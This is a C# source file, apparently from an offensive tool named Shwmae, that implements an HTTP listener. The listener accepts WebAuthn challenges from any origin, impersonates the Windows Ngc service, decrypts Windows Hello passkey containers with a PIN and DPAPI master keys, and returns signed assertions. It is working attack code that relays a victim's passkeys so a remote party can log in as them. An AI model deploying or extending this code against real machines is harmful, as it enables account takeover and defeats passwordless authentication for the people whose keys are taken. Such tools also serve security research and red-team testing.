using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Asn1;
using DPAPI;
using Newtonsoft.Json;
using Newtonsoft.Json.Serialization;
using NLog;
using Shwmae.Fido2;
using Shwmae.Ngc.Keys;
using Shwmae.Vault;

namespace Shwmae {
    public class WebAuthnHttpListener {

        ILogger log = LogManager.GetCurrentClassLogger();
        private HttpListener listener;
        const int DefaultTimeout = 60 * 5; // 5 mins (in seconds)
        TaskCompletionSource<string> source = new TaskCompletionSource<string>();
        Dictionary<Regex, Func<HttpListenerRequest, HttpListenerResponse, Task>> handlers;
        int port;
        public IEnumerable<Ngc.NgcContainer> Containers;
        public DecryptedCredential[] DecryptedCredentials;
        public string PIN;
        public IMasterKeyProvider MasterKeyProvider;
        static readonly char[] padding = { '=' };

        public WebAuthnHttpListener(int port) {
            handlers = new Dictionary<Regex, Func<HttpListenerRequest, HttpListenerResponse, Task>> {
                {new Regex("/challenge"), new Func<HttpListenerRequest, HttpListenerResponse, Task>(HandleChallenge) }
            };
            this.port = port;
        }

        public void Start() {
            listener = new HttpListener();
            listener.Prefixes.Add("http://*:" + port.ToString() + "/shwmae/"); 
            listener.Start();
            log.Info($"HTTP server listening on port {port}");
            Receive();
        }

        public void Stop() {
            listener.Stop();
        }

        public Task<string> WaitForCallbackAsync(int timeoutInSeconds = DefaultTimeout) {
            Task.Run(async () => {
                await Task.Delay(timeoutInSeconds * 1000);
                source.TrySetCanceled();
            });

            return source.Task;
        }

#pragma warning disable CS1998 // Async method lacks 'await' operators and will run synchronously
        async Task OkEmpty(HttpListenerRequest request, HttpListenerResponse response) {
            response.StatusCode = 200;
        }

        async Task NotFound(HttpListenerRequest request, HttpListenerResponse response) {
            response.StatusCode = 404;
        }
#pragma warning restore CS1998 // Async method lacks 'await' operators and will run synchronously

  
        async Task HandleChallenge(HttpListenerRequest request, HttpListenerResponse response) {

            var body = await new StreamReader(request.InputStream).ReadToEndAsync();
            var signedAssertions = new List<PublicKeyCredential>();
            dynamic assertionRequestObj = JsonConvert.DeserializeObject(body);

            var assertionRequest = assertionRequestObj.options;
            var origin = assertionRequestObj.origin.ToString();

            if (assertionRequest.publicKey != null) {

                var rpId = assertionRequest.publicKey.rpId.ToString();

                Console.WriteLine($"[=] Incoming WebAuthn assertion request for RpId {rpId}");

                using (var ctx = Utils.Impersonate("Ngc")) {
                    var fidoContainers = Containers
                        .Where(c => c.Keys.Any(k => k is NgcPassKey pk && pk.RpId == rpId));
                                         
                    if (fidoContainers.Any()) {
                        
                        foreach (var fidoContainer in fidoContainers) {

                            var protector = fidoContainer.GetFirstDecryptedProtector(PIN, DecryptedCredentials, MasterKeyProvider);

                            if (protector != null) {
                                var keys = fidoContainer.Keys.Where(k => k is NgcPassKey pk && pk.RpId == rpId);

                                //TOOD: Support RS256 assertions, currently we assume the key is ECDSA256
                                foreach (NgcPassKey key in keys) {
                                    var assertion = key.SignAssertion(Convert.FromBase64String(assertionRequest.publicKey.challenge.ToString()), origin, protector, MasterKeyProvider);
                                    signedAssertions.Add(assertion);
                                    Console.WriteLine($"[+] Created WebAuthn assertion for RpId {rpId} with user id {key.UserName} under Windows account {fidoContainer.Sid.Name}");
                                }

                            } else {
                                Console.WriteLine($"[!] Found credentials available for RpId {rpId} for user account {fidoContainer.Sid.Name}, but no protector could be decrypted");
                            }
                        }

                    } else {
                        Console.WriteLine($"[=] No credentials found for RpId {rpId}");
                    }
                }                                                                    
            }

            var responseBody = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(signedAssertions,
                new JsonSerializerSettings {
                    ContractResolver = new CamelCasePropertyNamesContractResolver()
                }));

            response.ContentType = "application/json";
            response.StatusCode = 200;
            response.ContentLength64 = responseBody.Length;
            await response.OutputStream.WriteAsync(responseBody,0, responseBody.Length);                           
        }

        void Receive() {
            listener.BeginGetContext(new AsyncCallback(ListenerCallback), listener);
        }

        async void ListenerCallback(IAsyncResult result) {
            if (listener.IsListening) {

                var context = listener.EndGetContext(result);
                var request = context.Request;
                var response = context.Response;

                response.AppendHeader("Access-Control-Allow-Origin", "*");
                response.AppendHeader("Access-Control-Allow-Methods", "*");
                response.AppendHeader("Access-Control-Allow-Headers", "content-type");

                // do something with the request
                log.Debug($"{request.HttpMethod} {request.Url.PathAndQuery}");
                response.ContentLength64 = 0;

                if (request.HttpMethod == "OPTIONS" && handlers.Any(kvp => kvp.Key.Match(request.Url.PathAndQuery).Success)) {
                    response.StatusCode = 204;
                } else {

                    var handler = handlers.Where(kvp => kvp.Key.Match(request.Url.PathAndQuery).Success).FirstOrDefault();

                    if (handler.Equals(default(KeyValuePair<Regex, Func<HttpListenerRequest, HttpListenerResponse, Task>>))) {
                        await NotFound(request, response);
                    } else {
                        await handler.Value(request, response);
                    }
                }

                response.Close();
                Receive();
            }
        }     
    }
}

